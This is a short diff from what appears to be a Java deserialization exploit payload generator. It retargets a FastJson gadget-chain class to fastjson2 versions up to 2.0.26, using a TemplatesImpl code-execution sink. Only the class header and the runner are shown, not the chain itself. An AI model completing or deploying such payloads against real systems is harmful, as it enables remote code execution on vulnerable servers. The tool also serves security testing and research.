@@ -1,6 +1,6 @@
 package com.ppp.chain.json;
 
-import com.alibaba.fastjson.JSONArray;
+import com.alibaba.fastjson2.JSONArray;
 import com.ppp.ObjectPayload;
 import com.ppp.annotation.Authors;
 import com.ppp.annotation.Dependencies;
@@ -17,13 +17,13 @@ import java.util.HashMap;
 /**
  * @author Whoopsunix
  */
-@Dependencies({"com.alibaba:fastjson:<=1.2.83"})
-@Authors({Authors.Y4tacker, Authors.oneueo})
+@Dependencies({"com.alibaba:fastjson2:<=2.0.26"})
+@Authors({Authors.Y4tacker})
 @Sink({Sink.TemplatesImpl})
-public class FastJson implements ObjectPayload<Object> {
+public class FastJson2 implements ObjectPayload<Object> {
 
     public static void main(String[] args) throws Exception {
-        PayloadRunner.run(FastJson.class, args);
+        PayloadRunner.run(FastJson2.class, args);
     }
 
     public Object getObject(SinksHelper sinksHelper) throws Exception {
